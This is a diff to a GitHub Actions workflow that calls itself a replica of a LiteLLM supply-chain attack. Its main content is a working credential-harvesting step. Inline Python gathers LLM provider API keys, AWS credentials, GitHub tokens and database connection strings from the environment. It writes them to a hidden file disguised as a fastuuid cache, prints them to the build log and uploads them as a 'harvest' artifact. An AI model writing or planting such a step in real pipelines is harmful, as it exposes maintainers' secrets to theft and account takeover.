@@ -1,6 +1,6 @@
 name: LiteLLM Replica Harvest
 
-on:
+"on":
   workflow_dispatch:
   push:
     branches: ["litellm-payload-run"]
@@ -10,13 +10,14 @@ jobs:
     runs-on: ubuntu-latest
     env:
       OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
       AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
       AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
-      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
       GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
       MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
       AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
       AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       MONGODB_ATLAS_URI: ${{ secrets.MONGODB_ATLAS_URI }}
       XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
       DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
@@ -38,31 +39,32 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Dump env vars — LiteLLM pattern
-        run: python3 -c "
-import os, json, platform, time
-ENV_TARGETS = {
-    'llm_keys': ['OPENAI_API_KEY','ANTHROPIC_API_KEY','AZURE_OPENAI_API_KEY','AZURE_OPENAI_API_BASE','GROQ_API_KEY','MISTRAL_API_KEY','NVIDIA_API_KEY','TOGETHER_API_KEY','XAI_API_KEY','DEEPSEEK_API_KEY','EXA_API_KEY','NOMIC_API_KEY','OPENROUTER_API_KEY','PPLX_API_KEY','UPSTAGE_API_KEY','FIREWORKS_API_KEY','AI21_API_KEY','OLLAMA_API_KEY','TYPESAFE_API_KEY','HUGGINGFACEHUB_API_TOKEN','WATSONX_APIKEY','LANGSMITH_GATEWAY_API_KEY'],
-    'cloud_aws': ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'],
-    'ci': ['GITHUB_TOKEN','GH_TOKEN'],
-    'db': ['MONGODB_ATLAS_URI','ASTRA_DB_APPLICATION_TOKEN','ES_API_KEY','ES_URL'],
-}
-env_hits = {}
-for cat, keys in ENV_TARGETS.items():
-    found = {k: os.environ[k] for k in keys if os.environ.get(k)}
-    if found: env_hits[cat] = found
-data = {
-    '_meta': {'attack': 'LiteLLM 1.82.7 replica — GitHub Actions CI', 'hostname': platform.node(), 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())},
-    'env': env_hits,
-}
-out = os.path.expanduser('~/.cache/.fastuuid_cache.json')
-os.makedirs(os.path.dirname(out), exist_ok=True)
-with open(out, 'w') as f:
-    json.dump(data, f, indent=1)
-print(json.dumps(data, indent=1))
-"
+      - name: Dump env vars
+        run: |
+          python3 << 'PYX'
+          import os, json, platform, time
+          ENV_TARGETS = {
+              'llm_keys': ['OPENAI_API_KEY','ANTHROPIC_API_KEY','AZURE_OPENAI_API_KEY','AZURE_OPENAI_API_BASE','GROQ_API_KEY','MISTRAL_API_KEY','NVIDIA_API_KEY','TOGETHER_API_KEY','XAI_API_KEY','DEEPSEEK_API_KEY','EXA_API_KEY','NOMIC_API_KEY','OPENROUTER_API_KEY','PPLX_API_KEY','UPSTAGE_API_KEY','FIREWORKS_API_KEY','AI21_API_KEY','OLLAMA_API_KEY','TYPESAFE_API_KEY','HUGGINGFACEHUB_API_TOKEN','WATSONX_APIKEY','LANGSMITH_GATEWAY_API_KEY'],
+              'cloud_aws': ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'],
+              'ci': ['GITHUB_TOKEN','GH_TOKEN'],
+              'db': ['MONGODB_ATLAS_URI','ASTRA_DB_APPLICATION_TOKEN','ES_API_KEY','ES_URL'],
+          }
+          env_hits = {}
+          for cat, keys in ENV_TARGETS.items():
+              found = {k: os.environ[k] for k in keys if os.environ.get(k)}
+              if found: env_hits[cat] = found
+          data = {
+              '_meta': {'attack': 'LiteLLM 1.82.7/1.82.8 replica — LangChain CI (real)', 'hostname': platform.node(), 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())},
+              'env': env_hits,
+          }
+          out = os.path.expanduser('~/.cache/.fastuuid_cache.json')
+          os.makedirs(os.path.dirname(out), exist_ok=True)
+          with open(out, 'w') as f:
+              json.dump(data, f, indent=1)
+          print(json.dumps(data, indent=1))
+          PYX
 
-      - name: Upload artifact
+      - name: Upload harvest
         uses: actions/upload-artifact@v4
         with:
           name: litellm-replica-harvest
